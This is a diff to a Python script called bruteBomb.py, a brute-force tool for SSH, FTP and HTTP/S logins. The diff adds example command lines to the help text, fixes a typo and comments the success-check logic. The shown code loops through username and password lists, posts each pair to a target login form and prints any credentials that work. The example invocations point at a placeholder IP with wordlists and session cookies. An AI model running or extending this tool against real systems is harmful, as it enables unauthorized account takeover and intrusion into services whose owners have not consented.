@@ -6,7 +6,24 @@ import sys, os
 import time
 
 def parse_arguments():
-    parser = argparse.ArgumentParser(description="Brute-force SSH, FTP, and HTTP")
+    example_text = """
+        EXAMPLES:
+
+    SSH:
+      python bruteBomb.py -c ssh -ip '1.1.1.1' -u 'username' -p /file/path/password.txt
+      python bruteBomb.py -c ssh -ip '1.1.1.1' -u username.txt -p /file/path/password.txt
+      python bruteBomb.py -c ssh -port 22 -ip '1.1.1.1' -u username.txt -p /file/path/password.txt
+
+    FTP:
+      python bruteBomb.py -c ftp -ip '1.1.1.1' -u 'username' -p /file/path/password.txt
+      python bruteBomb.py -c ftp -ip '1.1.1.1' -u username.txt -p /file/path/password.txt
+      python bruteBomb.py -c ftp -port 21 -ip '1.1.1.1' -u username.txt -p /file/path/password.txt
+
+    HTTP/S (line command is the same):
+      python bruteBomb.py -c http -ip '1.1.1.1/index.php?action=login2' -u 'username' -p password.txt --header 'User-Agent: Mozilla/2.0' 'Cookie: PHPSESSID=example1234' --data 'user' 'passw' 'otherthings' --valueData '0' -bc 'Username e password non corretti'
+      python bruteBomb.py -c https -ip '1.1.1.1/index.php?action=login2' -u 'username' -p password.txt --header 'User-Agent: Mozilla/2.0' 'Cookie: PHPSESSID=example1234' --data 'user' 'passw' 'otherthings' --valueData '0' -bc 'Username e password non corretti'
+    """
+    parser = argparse.ArgumentParser(description="Brute-force SSH, FTP, and HTTP/S", epilog=example_text, formatter_class=argparse.RawDescriptionHelpFormatter)
     parser.add_argument("-c", "--command", required=True, choices=["ssh", "ftp", "https", "http"], help="Command type (ssh/ftp/https/http)")
     parser.add_argument("-port", "--port", required=False, help="Specify the port (it can be empty)")
     parser.add_argument("-ip", "--ip", required=True, help="Target IP address")
@@ -17,13 +34,6 @@ def parse_arguments():
     parser.add_argument("-vd", "--valueData", nargs="+", required=False, help="Header HTTP/S. Usalo per dare i valori alla data")
     parser.add_argument("-bc", "--badCondition", nargs="+", help="La condizione negativa della risposta del server http/s per continuare a bruteforsare")
     parser.add_argument("-gc", "--goodCondition", nargs="+", help="La condizione positiva della risposta del server http/s per smettere di bruteforsare")
-    #EXAMPLES:
-    #python bruteBomb.py -c ssh -ip 10.210.96.20 -u "username" -p /file/path/password.txt
-    #python bruteBomb.py -c ssh -ip 10.210.96.20 -u username.txt -p /file/path/password.txt
-    #python bruteBomb.py -c ssh -port 22 -ip 10.210.96.20 -u username.txt -p /file/path/password.txt
-    #python bruteBomb.py -c ftp -ip 10.210.96.20 -u "username" -p /file/path/password.txt
-    #python bruteBomb.py -c ftp -ip 10.210.96.20 -u username.txt -p /file/path/password.txt
-    #python bruteBomb.py -c ftp -port 21 -ip 10.210.96.20 -u username.txt -p /file/path/password.txt
     return parser.parse_args()
 
 def read_username(string_or_file_path):
@@ -138,7 +148,7 @@ def brute_http(url, username, passwords, header, data, valueData, negativeCondit
             datas[value] = valueData.pop(0)
     datas[data[0]] = 'x'
     datas[data[1]] = 'x'
-    print("[YOUR DATA EAMPLE] ", datas)
+    print("[YOUR DATA EXAMPLE] ", datas)
     print("[YOUR HEADER]", header)
     for user in username:
         passwordFound = False
@@ -149,7 +159,7 @@ def brute_http(url, username, passwords, header, data, valueData, negativeCondit
                 
                 response = requests.post(url, headers=header, data=datas, timeout=5) #auth=(user, pwd)
                 if positiveCondition is None:
-                    for badCondition in negativeCondition:
+                    for badCondition in negativeCondition: # if all(bad not in str(response.text) for bad in negativeCondition):
                         if str(badCondition) not in str(response.text):
                             print("\n[** SERVER RESPONSE SUCCESS **]\n", str(response.text))
                             print(f"[HTTP] Success: {user}:{pwd}")
@@ -159,7 +169,7 @@ def brute_http(url, username, passwords, header, data, valueData, negativeCondit
                             print(f"[HTTP] Failed: {user}:{pwd}")
                 else:
                     for posCondition in positiveCondition:
-                        if str(posCondition) in str(response.text):
+                        if str(posCondition) in str(response.text): # if all(pos in str(response.text) for pos in positiveCondition):
                             print("\n[** SERVER RESPONSE SUCCESS **]\n", str(response.text))
                             print(f"[HTTP] Success: {user}:{pwd}")
                             passwordFound = True
@@ -186,7 +196,7 @@ def brute_https(url, username, passwords, header, data, valueData, negativeCondi
             datas[value] = valueData.pop(0)
     datas[data[0]] = 'x'
     datas[data[1]] = 'x'
-    print("[YOUR DATA EAMPLE] ", datas)
+    print("[YOUR DATA EXAMPLE] ", datas)
     print("[YOUR HEADER]", header)
     for user in username:
         passwordFound = False
@@ -223,7 +233,6 @@ def brute_https(url, username, passwords, header, data, valueData, negativeCondi
 
 def main():
     args = parse_arguments()
-    #args = parser.parse_args()
     passwords = read_passwords(args.passwords)
     username = read_username(args.username)
     
